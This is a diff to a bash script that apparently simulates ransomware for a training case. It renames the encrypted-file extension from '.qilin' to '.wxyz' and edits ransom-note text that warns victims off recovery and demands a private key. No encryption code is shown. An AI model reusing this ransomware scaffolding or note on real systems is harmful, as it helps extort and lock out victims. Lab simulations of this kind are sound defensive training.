@@ -7,7 +7,7 @@ if [[ $# -ne 1 ]]; then
 fi
 
 TARGET_DIR="$1"
-EXTENSION=".qilin"
+EXTENSION=".wxyz"
 PASSPHRASE="case8-training-passphrase"
 RANSOM_NOTE="README_RECOVER_FILES.txt"
 
@@ -37,7 +37,7 @@ All important documents, archives, databases and project files on this system ha
 
 Do not rename encrypted files.
 Do not try to recover files with third-party tools.
-Do not modify or delete files with the .qilin extension.
+Do not modify or delete files with the .wxyz extension.
 
 To restore access to your data, you need a private recovery key.
 EOF
